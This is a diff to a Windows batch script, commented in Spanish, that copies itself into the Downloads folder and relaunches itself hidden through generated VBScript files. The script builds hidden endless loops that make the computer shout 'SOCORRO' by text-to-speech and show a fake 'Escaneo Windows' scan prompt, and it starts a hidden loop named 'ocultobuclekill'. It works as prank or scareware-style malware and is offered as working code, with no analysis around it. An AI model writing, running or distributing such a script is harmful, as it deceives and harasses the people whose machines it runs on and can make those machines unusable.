@@ -1,10 +1,7 @@
-rd /s /q %userprofile%\Downloads\carpeta
 md %userprofile%\Downloads\carpeta
 copy final.bat %userprofile%\Downloads\carpeta
-IF EXIST %userprofile%\Downloads\carpeta\oculto.vbs (
-goto :in
-)
-echo CreateObject("Wscript.Shell").Run "%userprofile%\Downloads\carpeta\final.bat", 0, True > %userprofile%\Downloads\carpeta\oculto.vbs
+IF EXIST %userprofile%\Downloads\carpeta\oculto.vbs goto in
+echo CreateObject("Wscript.Shell").Run "%userprofile%\Downloads\carpeta\final.bat", 0, True >%userprofile%\Downloads\carpeta\oculto.vbs
 start %userprofile%\Downloads\carpeta\oculto.vbs
 exit
 :in
@@ -25,7 +22,14 @@ echo Set David = CreateObject("SAPI.spVoice") >> %userprofile%\Downloads\carpeta
 echo Set David.Voice = David.GetVoices.Item(0) >> %userprofile%\Downloads\carpeta\voice.vbs 
 echo David.Rate = 2 >> %userprofile%\Downloads\carpeta\voice.vbs 
 echo David.Volume = 100 >> %userprofile%\Downloads\carpeta\voice.vbs 
-echo David.Speak "AYUDA POR FAVOR, AYUDA POR FAVOR, AYUDA POR FAVOR, " >> %userprofile%\Downloads\carpeta\voice.vbs
+echo David.Speak "SOCORRO" >> %userprofile%\Downloads\carpeta\voice.vbs
+rem BUCLE VOCES.bat
+echo :invoice > %userprofile%\Downloads\carpeta\buclevoicebat.bat
+echo start %userprofile%\Downloads\carpeta\voice.vbs >> %userprofile%\Downloads\carpeta\buclevoicebat.bat
+echo timeout 2 %userprofile%\Downloads\carpeta\voice.vbs >> %userprofile%\Downloads\carpeta\buclevoicebat.bat
+echo goto invoice >> %userprofile%\Downloads\carpeta\buclevoicebat.bat
+rem BUCLE voices.vbs
+echo CreateObject("Wscript.Shell").Run "%userprofile%\Downloads\carpeta\buclevoicebat.bat", 0, True > %userprofile%\Downloads\carpeta\ocultobuclevoice.vbs
 rem ALERTA DE AVISOS avisos.vbs 
 echo X=MsgBox("Quieres escanear el ordenador?",3+48,"Escaneo Windows") >> %userprofile%\Downloads\carpeta\avisos.vbs 
 rem bucle.bat de avisos.vbs
@@ -47,3 +51,4 @@ timeout 3
 start %userprofile%\Downloads\carpeta\ocultobuclekill.vbs
 start %userprofile%\Downloads\carpeta\voice.vbs
 start %userprofile%\Downloads\carpeta\ocultobucle.vbs
+start %userprofile%\Downloads\carpeta\ocultobuclevoice.vbs
